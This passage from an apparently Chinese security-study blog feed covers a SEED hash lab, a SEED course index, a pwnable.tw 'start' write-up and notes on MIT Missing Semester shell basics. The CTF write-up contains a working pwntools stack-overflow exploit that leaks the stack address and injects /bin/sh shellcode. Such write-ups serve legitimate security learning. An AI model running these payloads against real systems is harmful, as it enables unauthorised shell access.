b))<br></code></pre></td></tr></table></figure><p>命令行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">philo@DESKTOP-0MMJKEF:~$ vim 1.py<br>philo@DESKTOP-0MMJKEF:~$ sudo chmod +x 1.py<br>[sudo] password for philo:&#x27;<br>philo@DESKTOP-0MMJKEF:~$ python3 ./1.py<br>5 <br>27<br>philo@DESKTOP-0MMJKEF:~$<br></code></pre></td></tr></table></figure><p>发现即使仅仅改变了一个bit，生成的哈希值也有很大的改变</p><h1 id="Task-4-One-Way-Property-versus-Collision-Free-Property"><a href="#Task-4-One-Way-Property-versus-Collision-Free-Property" class="headerlink" title="Task 4: One-Way Property versus Collision-Free Property"></a>Task 4: One-Way Property versus Collision-Free Property</h1><p><strong>散列函数的单向性和无碰撞性的蛮力破解</strong></p><p>散列函数是一种将任意长度的输入映射到固定长度的输出的函数，通常用于验证消息的完整性和真实性。散列函数具有两个重要的属性：</p><ul><li>单向性</li><li>无碰撞性：很难找到两个不同的输入，使得散列函数对它们产生相同的散列值。</li></ul><p>在这个任务中，我们将使用蛮力方法来探究破坏这两个属性所需的时间。蛮力方法就是尝试所有可能的输入，直到找到一个满足条件的输入为止。</p><p>为了完成这个任务，我们需要使用 C 语言编写程序，调用 openssl 加密库中的消息摘要函数。消息摘要函数是一种常用的散列函数，例如 MD5 和 SHA-1。我们可以从 <a href="http://www.openssl.org/docs/crypto/evp_digestinit.html">http://www.openssl.org/docs/crypto/evp_digestinit.html</a> 中找到一个示例代码，我们需要熟悉这个示例代码，并根据我们的需求进行修改。</p><p>由于现代的散列函数都设计得很强大，对它们进行蛮力破解需要花费很长的时间。为了简化任务，我们将只使用散列值的前 24 位。也就是说，我们相当于使用了一个修改过的散列函数，它的输出长度只有 24 位。请注意，这样做会降低散列函数的安全性，并不适用于实际场景。</p><p>请设计并实现一个实验，回答以下问题：</p><ol><li>用蛮力法破坏单向性需要多少次试验？你应该多次重复你的实验，并报告你的平均试验次数。</li><li>用蛮力法破坏无碰撞性需要多少次试验？同样，你应该报告你的平均试验次数。</li><li>根据你的观察，使用蛮力法更容易破坏哪个属性？</li><li>(10个加分)你能用数学方法解释你观察到的差异吗？</li></ol><p>先看一下示例的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;openssl/evp.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    EVP_MD_CTX *mdctx; <span class="hljs-comment">// 创建一个消息摘要上下文对象</span><br>    <span class="hljs-keyword">const</span> EVP_MD *md; <span class="hljs-comment">// 创建一个消息摘要算法对象</span><br>    <span class="hljs-keyword">char</span> mess1[] = <span class="hljs-string">&quot;Test Message\n&quot;</span>; <span class="hljs-comment">// 定义第一个输入数据</span><br>    <span class="hljs-keyword">char</span> mess2[] = <span class="hljs-string">&quot;Hello World\n&quot;</span>; <span class="hljs-comment">// 定义第二个输入数据</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> md_value[EVP_MAX_MD_SIZE]; <span class="hljs-comment">// 定义一个数组，用来存储输出结果</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> md_len, i; <span class="hljs-comment">// 定义两个无符号整数，用来存储输出结果的长度和循环变量</span><br><br>    <span class="hljs-keyword">if</span> (argv[<span class="hljs-number">1</span>] == <span class="hljs-literal">NULL</span>) &#123; <span class="hljs-comment">// 如果没有传入命令行参数，就打印用法提示并退出</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Usage: mdtest digestname\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    md = EVP_get_digestbyname(argv[<span class="hljs-number">1</span>]); <span class="hljs-comment">// 根据命令行参数，获取对应的消息摘要算法</span><br>    <span class="hljs-keyword">if</span> (md == <span class="hljs-literal">NULL</span>) &#123; <span class="hljs-comment">// 如果获取失败，就打印错误信息并退出</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Unknown message digest %s\n&quot;</span>, argv[<span class="hljs-number">1</span>]);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    mdctx = EVP_MD_CTX_new(); <span class="hljs-comment">// 创建一个新的消息摘要上下文对象</span><br>    <span class="hljs-keyword">if</span> (!EVP_DigestInit_ex(mdctx, md, <span class="hljs-literal">NULL</span>)) &#123; <span class="hljs-comment">// 初始化消息摘要上下文对象，指定使用的算法和引擎（这里为 NULL）</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Message digest initialization failed.\n&quot;</span>); <span class="hljs-comment">// 如果初始化失败，就打印错误信息并释放上下文对象，然后退出</span><br>        EVP_MD_CTX_free(mdctx);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!EVP_DigestUpdate(mdctx, mess1, <span class="hljs-built_in">strlen</span>(mess1))) &#123; <span class="hljs-comment">// 更新消息摘要上下文对象，将第一个输入数据加入到计算中</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Message digest update failed.\n&quot;</span>); <span class="hljs-comment">// 如果更新失败，就打印错误信息并释放上下文对象，然后退出</span><br>        EVP_MD_CTX_free(mdctx);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!EVP_DigestUpdate(mdctx, mess2, <span class="hljs-built_in">strlen</span>(mess2))) &#123; <span class="hljs-comment">// 更新消息摘要上下文对象，将第二个输入数据加入到计算中</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Message digest update failed.\n&quot;</span>); <span class="hljs-comment">// 如果更新失败，就打印错误信息并释放上下文对象，然后退出</span><br>        EVP_MD_CTX_free(mdctx);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!EVP_DigestFinal_ex(mdctx, md_value, &amp;md_len)) &#123; <span class="hljs-comment">// 结束消息摘要计算，并将结果存储到 md_value 数组中，将长度存储到 md_len 变量中</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Message digest finalization failed.\n&quot;</span>); <span class="hljs-comment">// 如果结束失败，就打印错误信息并释放上下文对象，然后退出</span><br>        EVP_MD_CTX_free(mdctx);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    EVP_MD_CTX_free(mdctx); <span class="hljs-comment">// 释放消息摘要上下文对象</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Digest is: &quot;</span>); <span class="hljs-comment">// 打印输出提示</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; md_len; i++) <span class="hljs-comment">// 使用 for 循环遍历 md_value 数组中的每个元素</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%02x&quot;</span>, md_value[i]); <span class="hljs-comment">// 以十六进制格式打印每个元素的值</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>); <span class="hljs-comment">// 打印换行符</span><br><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">// 退出程序</span><br>&#125;<br></code></pre></td></tr></table></figure><p>代码使用了openssl的api、宏、函数、结构体计算了输入数据的哈希值，最终输出结果就是<code>Test Message\nHello World\n</code>这个字符串的哈希值</p><p>注意一下，编译的时候需要使用<code>gcc -o mdtest1 mdtest.c -lcrypto -lssl</code>命令，这是由于需要链接ssl和crytpto两个库</p><p><img src="https://img.gls.show/img/image-20230613010942993.png"></p><p>回到之前的题目要求，感觉用C太麻烦了，python方便一些，可以参考<a href="https://github.com/arafat1/One-Way-Property-versus-Collision-Free-Property">https://github.com/arafat1/One-Way-Property-versus-Collision-Free-Property</a></p>]]></content>
    
    
    <categories>
      
      <category>SEED-lab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SEED-lab 课程概览</title>
    <link href="/p/96910bf1/"/>
    <url>/p/96910bf1/</url>
    
    <content type="html"><![CDATA[<p>GitHub仓库链接：<a href="https://github.com/LaPhilosophie/seedlab">https://github.com/LaPhilosophie/seedlab</a><br>计算机自学指南链接：<a href="https://csdiy.wiki/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/SEEDLabs/">SU SEED Labs - CS自学指南</a></p><p><img src="/image/seed/seed2.0_vm.jpg"></p><blockquote><p>当你做完seedlab的那天，一切都将作废。你的本科作废，你的专业作废，星星作废，月亮作废，银河系作废，宇宙作废，你的爱作废，你的恨作废，你的前半生作废，你的现女友作废。悬梁五年苦学seed，大雪深埋垃圾本科！</p></blockquote><h1 id="seedlab"><a href="#seedlab" class="headerlink" title="seedlab"></a>seedlab</h1><p><a href="https://seedsecuritylabs.org/index.html">SEED</a> 项目是雪城大学的网安课程，由 NSF 提供130万美元的资金支持，为网安教育开发了动手实践性的实验练习（称为 SEED Lab）。课程理论教学和动手实践并重，包含详细的 <a href="https://github.com/seed-labs/seed-labs">开源讲义</a> 、视频教程、教科书（被印刷为多种语言）、开箱即用的基于虚拟机和 docker 的攻防环境等。目前全球有1050家研究机构在使用该项目。</p><p>涵盖计算机和信息安全领域的广泛主题，包括软件安全、网络安全、Web 安全、操作系统安全和移动应用安全。</p><ul><li>课程网站：<a href="https://seedsecuritylabs.org/index.html">https://seedsecuritylabs.org/index.html</a></li><li>课程视频：<a href="https://www.handsonsecurity.net/video.html">https://www.handsonsecurity.net/video.html</a></li><li>课程教材：<a href="https://www.handsonsecurity.net/index.html">https://www.handsonsecurity.net/index.html</a></li><li>课程作业：四十多个安全领域的lab，实验环境可由课程提供的定制虚拟机和 docker <a href="https://seedsecuritylabs.org/labsetup.html">快速搭建</a>，并且提供详细的原理讲解、实验指导。以 <a href="https://seedsecuritylabs.org/Labs_20.04/Software/Buffer_Overflow_Setuid/">缓冲区溢出实验</a> 为例，该实验属于 <a href="https://seedsecuritylabs.org/Labs_20.04/Software/">软件安全主题</a> ，这里是它的 <a href="https://seedsecuritylabs.org/Labs_20.04/Files/Buffer_Overflow_Setuid/Buffer_Overflow_Setuid.pdf">实验指导</a> ，这里是它对应的 <a href="https://www.handsonsecurity.net/files/chapters/buffer_overflow_c.pdf">教材内容</a></li></ul><h2 id="Software-Security-Labs"><a href="#Software-Security-Labs" class="headerlink" title="Software Security Labs"></a>Software Security Labs</h2><table><thead><tr><th>实验名称</th><th>GitHub链接</th><th>博客链接</th></tr></thead><tbody><tr><td>Buffer Overflow Attack Lab(16.04)</td><td><a href="https://github.com/LaPhilosophie/seedlab/tree/main/Buffer-Overflow%20Attack%20Lab%20%EF%BC%8816.04%EF%BC%89">GitHub链接</a></td><td><a href="https://gls.show/p/187136b6/">博客链接</a></td></tr><tr><td>Environment Variable and Set-UID Program Lab</td><td><a href="https://github.com/LaPhilosophie/seedlab/tree/main/Environment%20Variable%20and%20Set-UID%20Program%20Lab">GitHub链接</a></td><td><a href="https://gls.show/p/c51248f4/">博客链接</a></td></tr><tr><td>Race Condition Vulnerability Lab</td><td><a href="https://github.com/LaPhilosophie/seedlab/tree/main/Race_Condition">GitHub链接</a></td><td><a href="https://gls.show/p/529b2f3d/">博客链接</a></td></tr><tr><td>Shellcode</td><td><a href="https://github.com/LaPhilosophie/seedlab/tree/main/Shellcode">GitHub链接</a></td><td><a href="https://gls.show/p/a10ed24d/">博客链接</a></td></tr><tr><td>Dirty COW</td><td><a href="https://github.com/LaPhilosophie/seedlab/tree/main/Dirty%20COW">GitHub链接</a></td><td><a href="https://gls.show/p/495b96e/">博客链接</a></td></tr><tr><td>Format-String Vulnerability Lab</td><td><a href="https://github.com/LaPhilosophie/seedlab/tree/main/Format-String%20Vulnerability%20Lab">GitHub链接</a></td><td><a href="https://gls.show/p/df8f6639/">博客链接</a></td></tr><tr><td>Return-to-libc Attack Lab</td><td><a href="https://github.com/LaPhilosophie/seedlab/tree/main/Return-to-libc%20Attack%20Lab">GitHub链接</a></td><td><a href="https://gls.show/p/70d1fe8b/">博客链接</a></td></tr></tbody></table><h2 id="Cryptography-Labs"><a href="#Cryptography-Labs" class="headerlink" title="Cryptography Labs"></a>Cryptography Labs</h2><table><thead><tr><th>实验名称</th><th>GitHub链接</th><th>博客链接</th></tr></thead><tbody><tr><td>Pseudo Random Number Generation Lab</td><td><a href="https://github.com/LaPhilosophie/seedlab/tree/main/Pseudo%20Random%20Number%20Generation%20Lab">GitHub链接</a></td><td><a href="https://gls.show/p/c8db7269/">博客链接</a></td></tr><tr><td>RSA Public-Key Encryption and Signature Lab</td><td><a href="https://github.com/LaPhilosophie/seedlab/tree/main/RSA%20Public-Key%20Encryption%20and%20Signature%20Lab">GitHub链接</a></td><td><a href="https://gls.show/p/383dc23/">博客链接</a></td></tr><tr><td>MD5 Collision Attack Lab</td><td><a href="https://github.com/LaPhilosophie/seedlab/tree/main/MD5%20Collision%20Attack%20Lab">GitHub链接</a></td><td><a href="https://gls.show/p/45f7d752/">博客链接</a></td></tr><tr><td>One-Way-Hash-Function-and-MAC</td><td><a href="https://github.com/LaPhilosophie/seedlab/tree/main/One-Way%20Hash%20Function%20and%20MAC">GitHub链接</a></td><td><a href="https://gls.show/p/ae23a610/">博客链接</a></td></tr><tr><td>Public-Key Infrastructure (PKI) Lab</td><td><a href="https://github.com/LaPhilosophie/seedlab/tree/main/Public-Key%20Infrastructure%20(PKI)%20Lab">GitHub链接</a></td><td><a href="https://gls.show/p/135735d/">博客链接</a></td></tr></tbody></table><h2 id="Web-Security-Labs"><a href="#Web-Security-Labs" class="headerlink" title="Web Security Labs"></a>Web Security Labs</h2><table><thead><tr><th>实验名称</th><th>GitHub链接</th><th>博客链接</th></tr></thead><tbody><tr><td>Cross-site Scripting Attack Lab</td><td><a href="https://github.com/LaPhilosophie/seedlab/tree/main/Cross-site%20Scripting%20Attack%20Lab">GitHub链接</a></td><td><a href="https://gls.show/p/53d24de/">博客链接</a></td></tr><tr><td>SQL Injection Attack Lab</td><td><a href="https://github.com/LaPhilosophie/seedlab/tree/main/SQL%20Injection%20Attack%20Lab">GitHub链接</a></td><td><a href="https://gls.show/p/961c048e/">博客链接</a></td></tr><tr><td>Cross-site Request Forgery Attack Lab</td><td><a href="https://github.com/LaPhilosophie/seedlab/tree/main/Cross-Site%20Request%20Forgery%20Attack%20Lab">GitHub链接</a></td><td><a href="https://gls.show/p/cb388511/">博客链接</a></td></tr><tr><td>Shellshock Vulnerability Lab</td><td><a href="https://github.com/LaPhilosophie/seedlab/tree/main/shellshock">GitHub链接</a></td><td><a href="https://gls.show/p/9eb48b8c/">博客链接</a></td></tr></tbody></table><h2 id="Network-Security"><a href="#Network-Security" class="headerlink" title="Network Security"></a>Network Security</h2><table><thead><tr><th>实验名称</th><th>GitHub链接</th><th>博客链接</th></tr></thead><tbody><tr><td>Heartbleed Attack Lab</td><td><a href="https://github.com/LaPhilosophie/seedlab/tree/main/Heartbleed%20Attack%20Lab">GitHub链接</a></td><td><a href="https://gls.show/p/cd441a20/">博客链接</a></td></tr></tbody></table><h2 id="System-Security"><a href="#System-Security" class="headerlink" title="System Security"></a>System Security</h2><table><thead><tr><th>实验名称</th><th>GitHub链接</th><th>博客链接</th></tr></thead><tbody><tr><td>Meltdown Attack Lab</td><td><a href="https://github.com/LaPhilosophie/seedlab/tree/main/Meltdown%20Attack%20Lab">GitHub链接</a></td><td><a href="https://gls.show/p/a6055774/">博客链接</a></td></tr><tr><td>Spectre Attack Lab</td><td><a href="https://github.com/LaPhilosophie/seedlab/tree/main/Spectre%20Attack%20Lab">GitHub链接</a></td><td><a href="https://gls.show/p/2724e696/">博客链接</a></td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>SEED-lab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>pwnable-tw刷题记录</title>
    <link href="/p/a735da4/"/>
    <url>/p/a735da4/</url>
    
    <content type="html"><![CDATA[<h1 id="start"><a href="#start" class="headerlink" title="start"></a>start</h1><p>把二进制文件拖进32位ida看一下，发现只有start和exit两个函数</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span><span class="hljs-number">08048060</span> _start          proc <span class="hljs-built_in">near</span>               <span class="hljs-comment">; DATA XREF: LOAD:08048018↑o</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048060</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">esp</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048061</span>                 <span class="hljs-keyword">push</span>    offset _exit<br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048066</span>                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048068</span>                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">ebx</span>, <span class="hljs-built_in">ebx</span><br><span class="hljs-symbol">.text:</span>0804806A                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">ecx</span><br><span class="hljs-symbol">.text:</span>0804806C                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">edx</span><br><span class="hljs-symbol">.text:</span>0804806E                 <span class="hljs-keyword">push</span>    <span class="hljs-number">3A465443h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048073</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-number">20656874h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048078</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-number">20747261h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0804807D</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-number">74732073h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048082</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-number">2774654Ch</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048087</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">esp</span>        <span class="hljs-comment">; addr</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048089</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">dl</span>, <span class="hljs-number">14h</span>         <span class="hljs-comment">; len</span><br><span class="hljs-symbol">.text:</span>0804808B                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">bl</span>, <span class="hljs-number">1</span>           <span class="hljs-comment">; fd</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0804808D</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">al</span>, <span class="hljs-number">4</span><br><span class="hljs-symbol">.text:</span>0804808F                 <span class="hljs-keyword">int</span>     <span class="hljs-number">80h</span>             <span class="hljs-comment">; LINUX - sys_write</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048091</span>                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">ebx</span>, <span class="hljs-built_in">ebx</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048093</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">dl</span>, <span class="hljs-number">3Ch</span> <span class="hljs-comment">; &#x27;&lt;&#x27;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048095</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">al</span>, <span class="hljs-number">3</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048097</span>                 <span class="hljs-keyword">int</span>     <span class="hljs-number">80h</span>             <span class="hljs-comment">; LINUX -</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048099</span>                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">14h</span><br><span class="hljs-symbol">.text:</span>0804809C                 <span class="hljs-keyword">retn</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0804809D</span> <span class="hljs-comment">; void exit(int status)</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0804809D</span> _exit           proc <span class="hljs-built_in">near</span>               <span class="hljs-comment">; DATA XREF: _start+1↑o</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0804809D</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0804809D</span> status          = <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span>  <span class="hljs-number">4</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0804809D</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0804809D</span>                 <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">esp</span><br><span class="hljs-symbol">.text:</span>0804809E                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span>080480A0                 <span class="hljs-keyword">inc</span>     <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span>080480A1                 <span class="hljs-keyword">int</span>     <span class="hljs-number">80h</span>             <span class="hljs-comment">; LINUX - sys_exit</span><br><span class="hljs-symbol">.text:</span>080480A1 _exit           endp <span class="hljs-comment">; sp-analysis failed</span><br></code></pre></td></tr></table></figure><p>简单分析下start的逻辑：</p><p>先调用了write函数，打印字符串</p><ul><li>将old esp压栈</li><li>压栈五次，构建要输出的字符串</li><li>将esp的值传给ecx，ecx是打印开始的地址</li><li>设置dl和bl、al寄存器，分别对应字符串长度和文件描述符的值、系统调用号（write系统调用对应4）</li><li>打印出栈上构建的字符串，也即是我们运行start程序后输出的<code>Let&#39;s start the CTF:</code></li></ul><p>之后调用了read函数，将用户输入的内容存到栈上</p><p>最后add esp，pop eip，跳转到exit函数，程序结束</p><p>由于我们可以控制0x3c个缓冲区数据，而这个长度大于esp到ret addr的距离，因此存在溢出</p><p>payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br><br><span class="hljs-comment">#context.log_level = &quot;debug&quot;</span><br><span class="hljs-comment">#context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><br><span class="hljs-comment">#sh=process(&#x27;./start&#x27;)</span><br>sh=remote(<span class="hljs-string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="hljs-number">10000</span>)<br>sh.recv() <span class="hljs-comment"># 吞掉第一次的输出</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x14</span> + p32(<span class="hljs-number">0x8048087</span>)<br><br>sh.send(payload) <span class="hljs-comment"># 控制eip再次执行write函数，输出old_esp</span><br>old_esp=u32(sh.recv()[:<span class="hljs-number">4</span>])<br><br><span class="hljs-comment">#组织第二次的payload</span><br>shellcode= <span class="hljs-string">b&#x27;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#x27;</span><br><br>ret_addr=old_esp+<span class="hljs-number">20</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x14</span> + p32(ret_addr)+shellcode<br><span class="hljs-comment">#gdb.attach(sh)</span><br><br>sh.send(payload)<br><br>sh.interactive()<br><br></code></pre></td></tr></table></figure><p>几点解释：</p><ul><li>由于我们不知道栈的位置，因此需要借助write系统调用将old esp的地址打印出来，这样就可以定位到shellcode的地址</li><li>我们需要构造两次payload，第一次是得到old esp，第二次是劫持控制流到shellcode</li><li>如果使用asm(shellcraft.sh())，将会无法get shell，因为通过这种方式生成的shellcode是44字节，加上padding之后超出了能控制的0x3c的范围</li><li>关于栈帧的分析，可以参考<a href="https://viblo.asia/p/pwnabletw-pwnstart-qPoL7zXXJvk">https://viblo.asia/p/pwnabletw-pwnstart-qPoL7zXXJvk</a></li><li>$ find / -name flag查找flag</li></ul><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202305171148027.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>MIT-missing-semester计算机教育中缺失的一课</title>
    <link href="/p/4c1dfd0d/"/>
    <url>/p/4c1dfd0d/</url>
    
    <content type="html"><![CDATA[<p><img src="/image/missing-semester.png"></p><h1 id="Using-the-shell"><a href="#Using-the-shell" class="headerlink" title="Using the shell"></a>Using the shell</h1><p>访问带有空格的文件夹，比如my photos</p><ul><li>使用双引号括起来：”my photos”</li><li>使用转义：- my\ photos</li></ul><p>shell 执行 echo hello的过程：</p><ul><li> shell 基于空格分割命令并进行解析，然后执行第一个单词代表的程序，并将后续的单词作为程序可以访问的参数</li><li>shell首先判断命令是不是编程关键字，如果不是就从环境变量<code>$PATH</code>中寻找，可以通过<code>echo $PATH</code>命令查找路径<ul><li> 可以通过which命令查找可执行文件/链接所在的路径</li></ul></li></ul><p>路径：</p><ul><li>shell 中的路径是一组被分割的目录，在 Linux 和 macOS 上使用 / 分割，而在Windows上是 \</li><li>绝对路径与相对路径</li><li>ls可以列出路径<ul><li>ls -al命令的输出结果第一列有10个字母，第一个字母若是d表示是一个文件夹</li><li>若要进入某一个文件夹，需要可执行权限</li><li>若要列出它所包含的内容，需要可读权限</li></ul></li></ul><h1 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h1><ul><li><code>cat &lt; hello.txt &gt; hello2.txt</code>将hello.txt文件的内容重定向到cat命令，cat将输出重定向到hello2.txt文件</li><li>使用管道可以重定向，比如<code>ls -l / | tail -n1</code>将会列出<code>ls -l / </code>命令最后一行的输出</li><li>一个报错分析<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata">sudo echo 3 &gt; brightness<br><span class="hljs-keyword">An</span> <span class="hljs-keyword">error</span> occurred <span class="hljs-keyword">while</span> redirecting <span class="hljs-keyword">file</span> &#x27;brightness&#x27;<br><span class="hljs-keyword">open</span>: Permission denied<br></code></pre></td></tr></table></figure><ul><li>shell (权限为您的当前用户) 在设置 sudo 